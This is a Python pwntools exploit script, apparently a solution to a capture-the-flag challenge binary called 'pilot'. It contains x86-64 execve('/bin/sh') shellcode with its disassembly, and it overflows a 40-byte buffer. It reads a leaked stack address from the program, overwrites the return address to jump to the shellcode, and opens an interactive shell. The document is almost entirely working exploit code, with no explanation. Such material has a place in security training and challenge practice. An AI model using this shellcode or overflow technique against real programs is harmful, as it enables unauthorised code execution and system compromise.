from pwn import *

'''
00000000  31F6              xor esi,esi
00000002  48BFD19D9691D08C  mov rdi,0xff978cd091969dd1
         -97FF
0000000C  48F7DF            neg rdi
0000000F  F7E6              mul esi                                                                                                                                                                               
00000011  043B              add al,0x3b                                                                                                                                                                           
00000013  57                push rdi                                                                                                                                                                              
00000014  54                push rsp                                                                                                                                                                              
00000015  5F                pop rdi                                                                                                                                                                               
00000016  0F05              syscall 
'''

shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
pwn = process("./pilot")

buf = shellcode
buf += b'\x41' * (40 - len(buf))

pwn.recvuntil(b'Location:')
input_addr = pwn.recvline()
input_addr = input_addr.decode()
input_addr = input_addr.strip("\n")
input_addr = int(input_addr,16)
buf += p64(input_addr)

pwn.send(buf)
pwn.interactive()
